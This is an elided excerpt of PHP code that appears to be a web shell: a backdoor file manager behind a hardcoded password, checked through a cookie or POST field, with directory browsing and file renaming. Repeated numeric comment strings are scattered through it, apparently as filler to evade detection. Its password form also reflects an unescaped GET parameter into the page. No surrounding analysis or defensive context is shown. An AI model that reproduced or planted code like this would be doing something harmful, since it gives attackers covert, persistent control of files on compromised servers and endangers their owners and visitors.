...
$auth_key = "14772429486f4014b83b5d874069a014";
...
$pass = false;
if (isset($_COOKIE['pw_name_52145'])) {
    if(($_COOKIE['pw_name_52145']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_52145'])) {
        if(($_POST['pw_name_52145']) == $auth_key) {
            setcookie("pw_name_52145", $_POST['pw_name_52145']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_52145' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1739267203298537 1739267203816639 1739267203849498 1739267203650761
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1739267203298537 1739267203816639 1739267203849498 1739267203650761
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1739267203298537 1739267203816639 1739267203849498 1739267203650761
            $name = PATH . "/" . $_GET['r'];
